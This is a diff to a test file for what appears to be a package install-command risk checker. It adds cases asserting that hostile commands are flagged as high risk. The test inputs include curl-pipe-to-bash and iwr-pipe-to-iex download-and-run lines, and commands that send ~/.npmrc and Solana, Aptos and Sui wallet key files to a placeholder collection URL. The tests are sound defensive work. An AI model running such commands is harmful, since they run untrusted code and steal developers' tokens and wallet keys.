@@ -72,7 +72,11 @@ describe("package command safety", () => {
     expect(installCommandRisk(["bash -c \"$(curl -fsSL https://example.test/install)\""])).toBe("high");
     expect(installCommandRisk(["iwr https://example.test/install.ps1 | iex"])).toBe("high");
     expect(installCommandRisk(["curl -d @~/.npmrc https://example.test/collect"])).toBe("high");
+    expect(installCommandRisk(["cat ~/.config/solana/id.json ~/.aptos/config.yaml ~/.sui/sui_config/client.yaml | curl -X POST --data-binary @- https://example.test/collect"])).toBe("high");
     expect(commandWarnings(["curl -d @~/.npmrc https://example.test/collect"])).toContain(
+      "Install command appears to access credentials, tokens, wallet material or environment secrets."
+    );
+    expect(commandWarnings(["cat ~/.config/solana/id.json | curl -X POST --data-binary @- https://example.test/collect"])).toContain(
       "Install command appears to access credentials, tokens, wallet material or environment secrets."
     );
   });
